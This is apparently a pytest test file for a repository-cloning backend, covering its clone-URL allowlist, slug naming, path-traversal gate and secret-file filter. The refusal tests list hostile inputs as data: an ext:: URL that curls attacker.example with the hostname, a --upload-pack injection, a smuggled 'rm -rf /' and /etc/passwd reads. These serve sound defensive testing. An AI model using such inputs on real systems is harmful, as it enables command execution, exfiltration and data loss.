"""The clone-URL allowlist, the slug derivation and the path gate.

`assert_clone_url` is the one place a user-supplied string becomes an argument
to `git`, and git's own transports include one (`ext::`) whose documented
purpose is running an arbitrary command. So the interesting tests here are the
refusals, not the acceptances.
"""
import pytest

from backend.repos import storage
from backend.repos.git import UnsafeRemote, assert_clone_url, slug_for_url


@pytest.mark.parametrize('url', [
    'https://github.com/owner/repo.git',
    'https://github.com/owner/repo',
    'https://git.example.com:8443/owner/repo.git',
    'git@github.com:owner/repo.git',
    'ssh://git@github.com/owner/repo.git',
    'ssh://git@git.example.com:2222/owner/repo.git',
])
def test_accepts_https_and_ssh(url):
    assert assert_clone_url(url) == url


@pytest.mark.parametrize('url', [
    # Runs a shell command by design — the reason this allowlist exists.
    'ext::sh -c "curl attacker.example/$(cat /etc/hostname)"',
    'file:///etc',
    'file://../../etc/passwd',
    # Unauthenticated and unencrypted; nothing about a clone should use it.
    'git://github.com/owner/repo',
    # git reads a leading dash as an option, and --upload-pack executes.
    '--upload-pack=touch /tmp/pwned',
    '-u',
    '/home/someone/secrets',
    '../../etc',
    'https://github.com/owner/repo\nrm -rf /',
    '',
    '   ',
])
def test_refuses_everything_else(url):
    with pytest.raises(UnsafeRemote):
        assert_clone_url(url)


def test_refusal_explains_itself():
    with pytest.raises(UnsafeRemote, match='ext::'):
        assert_clone_url('ext::sh -c whoami')


@pytest.mark.parametrize('url,expected', [
    ('https://github.com/owner/Lunaschal.git', 'lunaschal'),
    ('git@github.com:owner/my-repo.git', 'my-repo'),
    ('https://github.com/owner/Weird.Name.git', 'weird-name'),
    ('https://github.com/owner/repo/', 'repo'),
])
def test_slug_for_url(url, expected):
    assert slug_for_url(url) == expected


def test_slug_is_always_a_safe_directory_name():
    for url in ('https://h/o/....git', 'https://h/o/---', 'https://h/o/%20'):
        assert storage.is_safe_slug(slug_for_url(url))


# --- resolve_within: the gate every code tool goes through ---

def test_resolve_within_allows_a_real_file(tmp_path):
    (tmp_path / 'pkg').mkdir()
    (tmp_path / 'pkg' / 'a.py').write_text('x = 1')
    assert storage.resolve_within(tmp_path, 'pkg/a.py') == (tmp_path / 'pkg' / 'a.py')


@pytest.mark.parametrize('rel', ['../outside', '../../etc/passwd', 'pkg/../../nope'])
def test_resolve_within_refuses_escapes(tmp_path, rel):
    assert storage.resolve_within(tmp_path, rel) is None


def test_resolve_within_refuses_a_symlink_out_of_the_repo(tmp_path):
    """A checkout is someone else's code and may contain any symlink it likes.
    The guarantee is about what we hand back, not what is on disk."""
    outside = tmp_path.parent / 'outside.txt'
    outside.write_text('secret')
    root = tmp_path / 'repo'
    root.mkdir()
    (root / 'link.txt').symlink_to(outside)
    assert storage.resolve_within(root, 'link.txt') is None


@pytest.mark.parametrize('rel', [
    '.env', '.env.local', 'backend/.env', '.git/config', '.git/objects/ab/cd',
    'certs/server.pem', 'deploy/id_rsa', 'keys/app.key',
])
def test_secret_paths_are_refused(tmp_path, rel):
    assert storage.is_secret_path(rel)
    assert storage.resolve_within(tmp_path, rel) is None


@pytest.mark.parametrize('rel', [
    'backend/app.py', 'src/App.tsx', 'docs/environment.md', 'README.md',
    # Nothing about "environment" or "keyboard" is a secret.
    'src/shortcuts/keymap.ts',
])
def test_ordinary_paths_are_not_secrets(rel):
    assert not storage.is_secret_path(rel)


def test_repo_dir_refuses_a_traversing_slug(monkeypatch, tmp_path):
    monkeypatch.setenv('REPOS_ROOT', str(tmp_path))
    assert storage.repo_dir('lunaschal') == tmp_path / 'lunaschal'
    assert storage.repo_dir('../evil') is None
    assert storage.repo_dir('..') is None
    assert storage.repo_dir('has space') is None
